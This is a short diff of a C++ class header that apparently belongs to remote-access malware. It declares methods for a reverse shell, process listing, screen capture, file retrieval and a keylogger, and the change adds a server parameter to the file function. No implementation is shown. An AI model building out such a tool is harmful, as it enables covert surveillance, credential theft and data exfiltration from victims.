@@ -14,7 +14,7 @@ public:
 	std::string reverseShell(std::string cmd);
 	void getProcess();
 	LPVOID getScreen();
-	void getFile(std::string& path);
+	void getFile(std::string& path, LPCWSTR server);
 	void keyLogger();
 };
 
